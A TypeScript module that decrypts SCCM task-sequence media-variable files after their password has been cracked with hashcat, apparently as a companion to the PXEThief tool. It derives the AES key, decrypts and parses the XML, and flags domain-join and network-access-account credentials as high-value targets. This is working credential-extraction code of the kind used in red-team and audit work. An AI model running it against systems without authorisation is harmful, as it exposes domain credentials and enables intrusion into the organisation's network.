/**
 * ConfigMgr (SCCM) media-variable decryption.
 *
 * Companion to hashcat mode 19850: the module cracks the password protecting
 * an SCCM OSD task-sequence media-variable file (produced by PXEThief); this
 * file decrypts that file once the password is known.
 *
 * Key derivation (Windows CryptoAPI `CryptDeriveKey(CALG_AES_128, …)`):
 *
 *     H       = SHA1(utf16le(password))      // 20 bytes
 *     padded  = H + 0x00 * 44                // zero-pad to 64
 *     ipad    = padded XOR 0x36 (per byte)
 *     K       = SHA1(ipad)                   // 20 bytes
 *     AES_KEY = K[0..15]                     // first 16 bytes = AES-128 key
 *
 * The on-disk file layout (first 40 bytes are what the hashcat line encodes):
 *
 *     [0..15]  header (16 bytes, unused)
 *     [16..19] ALG_ID  = 0e 66 00 00  (CALG_AES_128)
 *     [20..23] header  (4 bytes, unused)
 *     [24..]   AES-128-CBC ciphertext, IV = 16×0x00, PKCS#7-padded
 *
 * Plaintext is UTF-16LE XML beginning `"<?xml ve"`. The hashcat module checks
 * exactly this — encrypting that 16-byte plaintext under the derived key
 * matches the first ciphertext block, which is a known-plaintext oracle given
 * CBC with a zero IV.
 */

import crypto from "crypto";

const ALG_ID_AES_128 = 0x0000660e; // CALG_AES_128 (little-endian 0x0e 0x66 0x00 0x00)
const SCCM_HEADER_LEN = 24; // bytes of header before the ciphertext
const SCCM_IV = Buffer.alloc(16, 0);

/** Derive the AES-128 key the way SCCM (CryptoAPI CryptDeriveKey) does. */
export function deriveSccmAesKey(password: string): Buffer {
  const h = crypto.createHash("sha1").update(Buffer.from(password, "utf16le")).digest(); // 20B
  const padded = Buffer.alloc(64);
  h.copy(padded); // pad with zeros to 64 bytes
  const ipad = Buffer.from(padded.map((b) => b ^ 0x36));
  const k = crypto.createHash("sha1").update(ipad).digest(); // 20B
  return k.subarray(0, 16);
}

export interface SccmDecryptResult {
  /** Raw decrypted bytes (UTF-16LE). */
  plaintext: Buffer;
  /** Decoded XML string (UTF-16LE → UTF-16). */
  xml: string;
}

export class SccmDecryptError extends Error {
  constructor(
    public readonly code:
      | "FILE_TOO_SHORT"
      | "WRONG_ALG_ID"
      | "CIPHERTEXT_NOT_BLOCK_ALIGNED"
      | "WRONG_PASSWORD",
    message: string
  ) {
    super(message);
    this.name = "SccmDecryptError";
  }
}

/**
 * Decrypt an SCCM media-variables file with a cracked password.
 *
 * Throws `SccmDecryptError` for a malformed file, a non-AES-128 ALG_ID, or
 * when decryption yields a plaintext that doesn't start with the known
 * UTF-16LE XML header (the practical "wrong password" check — the first
 * cleartext bytes of an SCCM media-variables file are ALWAYS `"<?xml "`).
 */
export function decryptSccmMediaVariables(
  file: Buffer,
  password: string
): SccmDecryptResult {
  if (file.length < SCCM_HEADER_LEN + 16)
    throw new SccmDecryptError(
      "FILE_TOO_SHORT",
      `file is ${file.length} bytes; need at least ${SCCM_HEADER_LEN + 16}`
    );

  const algId = file.readUInt32LE(16);
  if (algId !== ALG_ID_AES_128)
    throw new SccmDecryptError(
      "WRONG_ALG_ID",
      `expected CALG_AES_128 (0x660e); got 0x${algId.toString(16)}`
    );

  // CBC decrypts whole 16-byte blocks; trim any non-aligned trailing bytes
  // (shouldn't happen on a well-formed file, but be permissive).
  const ctAll = file.subarray(SCCM_HEADER_LEN);
  const ct = ctAll.subarray(0, Math.floor(ctAll.length / 16) * 16);
  if (ct.length === 0)
    throw new SccmDecryptError(
      "CIPHERTEXT_NOT_BLOCK_ALIGNED",
      "no full 16-byte ciphertext blocks present"
    );

  const key = deriveSccmAesKey(password);
  const decipher = crypto.createDecipheriv("aes-128-cbc", key, SCCM_IV);
  decipher.setAutoPadding(false); // we strip PKCS#7 ourselves after a sanity check
  const raw = Buffer.concat([decipher.update(ct), decipher.final()]);

  // Wrong-password check: the first 16 plaintext bytes MUST be UTF-16LE
  // `"<?xml ve"` (how the hashcat module verifies a guess).
  const header = Buffer.from("<?xml ve", "utf16le");
  if (!raw.subarray(0, 16).equals(header))
    throw new SccmDecryptError(
      "WRONG_PASSWORD",
      "decrypted header is not `<?xml ve` — wrong password or non-SCCM file"
    );

  // Strip PKCS#7 padding if the last byte is a plausible pad length.
  const padLen = raw[raw.length - 1]!;
  const plaintext =
    padLen >= 1 && padLen <= 16 ? raw.subarray(0, raw.length - padLen) : raw;

  return { plaintext, xml: plaintext.toString("utf16le") };
}

/**
 * Pull `<variable name="…" …>value</variable>` pairs out of the decrypted XML.
 *
 * Matches SCCM media-variable element shapes. Intentionally regex-based rather
 * than a full XML parser: the file is small, flat, and the useful fields are
 * attribute/text pairs on known elements (no nesting, no namespaces matter).
 */
export function parseMediaVariables(xml: string): Record<string, string> {
  const out: Record<string, string> = {};
  // <variable name="X" ...>Y</variable>  OR  <var name="X">Y</var>
  const re =
    /<(variable|var)[^>]*\sname="([^"]+)"[^>]*>([\s\S]*?)<\/\1>/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(xml)) !== null) {
    const name = m[2]!;
    const value = m[3]!;
    out[name] = value;
  }
  return out;
}

/** Names worth surfacing first — operator credentials and TS secrets. */
export const SCCM_HIGH_VALUE_VAR_NAMES: readonly string[] = [
  "OSDJoinAccount",
  "OSDJoinPassword",
  "OSDJoinDomainName",
  "NetworkAccessUsername",
  "NetworkAccessPassword",
  "_SMSTSReserved1-000",
  "_SMSTSReserved2-000",
];
